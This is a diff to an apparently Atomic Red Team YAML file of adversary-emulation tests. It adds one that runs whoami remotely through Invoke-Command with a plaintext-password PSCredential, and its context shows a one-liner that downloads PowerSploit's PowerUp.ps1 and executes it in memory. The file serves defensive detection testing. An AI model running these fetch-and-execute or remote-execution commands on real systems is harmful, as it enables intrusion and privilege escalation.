@@ -425,3 +425,28 @@ atomic_tests:
       iex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/d943001a7defb5e0d1657085a77a0e78609be58f/Privesc/PowerUp.ps1 -UseBasicParsing)
       Invoke-AllChecks
     name: powershell
+   
+- name: Remote Code Execution with PS Credentials
+  description: This atomic emulates Remote Code Execution using PS Credentials 
+  supported_platforms:
+  - windows
+  input_arguments:
+    username:
+      description: This is going to be the username running the powershell command
+      type: string
+      default: $env:USERNAME
+    remotehost:
+      description: This is going to be the remote hostname of the machine you are running the powershell command on.
+      type: string
+      default: $env:COMPUTERNAME
+    password:
+      description: This is the password to be used with the user provided in the previous input argument.
+      type: string
+      default: test12345
+  executor:
+    command: |-
+      $SecPassword = ConvertTo-SecureString "#{password}" -AsPlainText -Force
+      $Cred = New-Object System.Management.Automation.PSCredential("#{username}", $SecPassword)
+      Invoke-Command -ComputerName "#{remotehost}" -Credential $Cred -ScriptBlock {whoami}
+    name: powershell
+  
